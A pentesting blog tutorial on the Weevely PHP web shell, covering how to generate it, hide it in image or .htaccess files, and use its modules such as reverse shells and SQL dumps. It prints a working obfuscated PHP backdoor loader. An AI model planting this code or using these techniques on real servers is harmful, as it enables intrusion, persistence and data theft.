---
date: 2015-02-19
title: Weevely
tags:
- backdoor
- remote command execution
see_also:
  -
    link: Introduction to pentesting
    url: /introduction-to-pentesting/
---
Weevely is a PHP command line web shell usually used as a backdoor while performing the post exploitation phase of a penetration test. 
By default in Kali Linux, the installed version 1.1 isn't supported anymore but version 3 is available on [GitHub](https://github.com/epinna/weevely3 "Weevely on GitHub").

Generate the backdoor:

`weevely generate.<mode> <password> <path>`

The password is optionnal but it's important to protect your customer from other users because an unwanted access can easily lead to a full access on the server with privileges escalation. There is three kinds of backdoor available but this functionnality seems to have been removed in version 3.

- **htaccess**: a single `.htaccess` file is created containing the malicious code and the right Apache directive so that all `.htaccess` files are considered as regular PHP script
- **img**: giving an existing image, Weevely will concatenate the binary datas and the malicious code, plus it also creates an `.htaccess` 
to tell Apache that the image should be considered as a regular PHP script (that means both files should be uploaded on the target server)
- **php**: this is the default, a single PHP script is generated

<!--more-->

Example:

![Weevely generate](/images/weevely-generate.png)

A `sessions` directory has also been created to log every command. 
No matter what creation mode you choosed the obfuscated generated PHP code looks like this:

```php
<?php
$ztqi = str_replace("h","","hshtrh_rhehphlhahche");
$hule="am9pbihhcnJhehrV9zbGhrljZSgkYSwkhrYhrygkYhrSktMykpKShrkpO2VjaG8gJzwvJhry4kay4nhrPic7fQ==";
$xhmv="PSdlcnRhr5JztlY2hvIhrCc8Jy4kay4nPihrc7ZXhrZhbChiYXNlNjRfZGVjbhr2RlKHBhryZWdfchrmVhrwbGFjZ";
$ezko="ShhcnJheSgnL1hrteXHc9XHNdLycsJy9chrcy8nKSwgYXJyYXkohrJyhrcshrJyhrsnKSwg";
$kyjf="JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYhrSk9PSdheicgJihrYgJGMoJGEpPjMpeyRr";
$tjbu = $ztqi("g", "", "basgeg6g4g_gdgegcgode");
$plri = $ztqi("y","","cyreyatye_yfuynycytyiyon");
$pigj = $plri('', $tjbu($ztqi("hr", "", $kyjf.$xhmv.$ezko.$hule))); $pigj();
?>
```

There is different ways to inject the backdoor on the target server: file upload, SQL injection and so on... 
Once you have infected your target, you can connect to the client with the password you choosed:

![Weevely connect](/images/weevely-connect.png)

Running `:help `will display the list of all modules available or the detailed usage informations of the given module.

| Command              | Description |
| -------------------- | ------------- |
| :audit.systemfiles   | Find wrong system files permissions |
| :audit.phpconf       | Check php security configurations |
| :audit.mapwebfiles   | Crawl and enumerate web folders files permissions |
| :audit.userfiles     | Guess files with wrong permissions in users home folders |
| :audit.etcpasswd     | Enumerate users and /etc/passwd content |
| :shell.sh            | Execute system shell command |
| :shell.php           | Execute PHP statement |
| :system.info         | Collect system informations |
| :backdoor.reversetcp | Send reverse TCP shell |
| :backdoor.tcp        | Open a shell on TCP port |
| :bruteforce.sqlusers | Bruteforce all SQL users |
| :bruteforce.sql      | Bruteforce SQL username |
| :file.edit           | Edit remote file |
| :file.mount          | Mount remote filesystem using HTTPfs |
| :file.webdownload    | Download web URL to remote filesystem |
| :file.touch          | Change file timestamps |
| :file.upload2web     | Upload binary/ascii file into remote web folders and guess corresponding url |
| :file.download       | Download binary/ascii files from the remote filesystem |
| :file.enum           | Enumerate remote paths |
| :file.read           | Read remote file |
| :file.upload         | Upload binary/ascii file into remote filesystem |
| :file.check          | Check remote files type, md5 and permission |
| :file.rm             | Remove remote files and folders |
| :file.ls             | List directory contents |
| :sql.console         | Run SQL console or execute single queries |
| :sql.dump            | Get SQL database dump |
| :net.phpproxy        | Install remote PHP proxy |
| :net.ifaces          | Print interfaces addresses |
| :net.scan            | Port scan open TCP ports |
| :net.proxy           | Install and run Proxy to tunnel traffic through target |
| :find.suidsgid       | Find files with superuser flags |
| :find.name           | Find files with matching name |
| :find.perms          | Find files with write, read, execute permissions |

Another good point for Weevely is the verbosity, the remote agent is very low footprint. Below my Apache logs after running some commands:

![Weevely traces](/images/weevely-traces.png)

As you may notice the user-agent has also been randomized wich is usually a good idea...


## External resources

- [Introduction to pentesting]({{< ref "/posts/introduction-to-pentesting" >}})
